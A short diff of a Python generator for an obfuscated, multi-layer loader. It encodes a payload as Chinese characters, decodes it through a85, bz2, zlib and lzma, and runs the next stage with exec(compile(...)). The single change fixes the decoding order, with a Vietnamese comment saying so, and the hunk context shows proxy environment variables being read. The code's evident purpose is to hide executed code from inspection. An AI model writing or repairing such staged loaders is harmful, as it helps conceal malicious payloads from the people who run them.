@@ -875,7 +875,8 @@ for {V[1]} in [{se('HTTP_PROXY')},{se('HTTPS_PROXY')},{se('http_proxy')},{se('ht
         f"_HD2 = {repr(HANZI_DEC)}\n"
         "def _hd2(s): return bytes.fromhex(''.join(_HD2[c] for c in s))\n"
         f"def {lv2}(_pl, _sig):\n"
-        "    _raw = _64_2.a85decode(_lx2.decompress(_b2.decompress(_z2.decompress(_hd2(_pl)))))\n"
+        # Đã sửa lại đúng thứ tự: a85decode -> bz2 -> zlib -> lzma
+        "    _raw = _lx2.decompress(_z2.decompress(_b2.decompress(_64_2.a85decode(_hd2(_pl)))))\n"
         f"    exec(compile({repr(layer3_src)}, '<l3>', 'exec'), globals())\n"
         f"    {lv3}(_raw, _sig)\n"
         f"{lv2}({repr(hanzi_payload)}, {repr(integrity_hash)})\n"
